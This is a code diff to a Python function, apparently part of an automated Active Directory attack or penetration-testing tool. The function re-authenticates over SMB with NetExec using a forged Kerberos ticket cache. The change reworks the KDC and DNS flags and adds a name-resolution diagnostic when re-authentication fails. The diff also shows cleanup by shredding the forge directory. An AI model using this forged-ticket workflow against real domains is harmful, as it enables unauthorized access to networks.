@@ -190,9 +190,10 @@ def forge_and_reauth(ctx, forge_argv: list[str], ccache_name: str, reauth_target
         return False, steps, errors
 
     # 2) re-authenticate THROUGH the forged ccache only (no operator creds). The
-    #    DC is used as both KDC and resolver so no realm/host DNS is required.
+    #    KDC is always named (--kdcHost); --dns-server is opt-in (cfg.dns_server),
+    #    so without it the tool's system/``/etc/hosts`` resolver finds the target.
     reauth_argv = ["nxc", "smb", reauth_target, "--use-kcache",
-                   "--kdcHost", ctx.config.dc_ip, "--dns-server", ctx.config.dc_ip]
+                   *netresolve.nxc_kerberos_flags(ctx.config)]
     res = ctx.runner.run(reauth_argv, env={"KRB5CCNAME": str(ccache)},
                          timeout=ctx.config.tool_timeout_s)
     reauth_out = res.stdout or ""
@@ -203,6 +204,10 @@ def forge_and_reauth(ctx, forge_argv: list[str], ccache_name: str, reauth_target
                                  else "forged ticket did not authenticate as the forged principal"))
     if not ok:
         errors.append("reauth_failed")
+        diag = netresolve.classify_resolution_failure(
+            ctx.config, reauth_target, reauth_out + "\n" + (res.stderr or ""))
+        if diag:
+            errors.append(diag)        # actionable name-resolution diagnostic (persisted)
     _shred(forge_dir)
     _rmdir(forge_dir)
     return ok, steps, errors
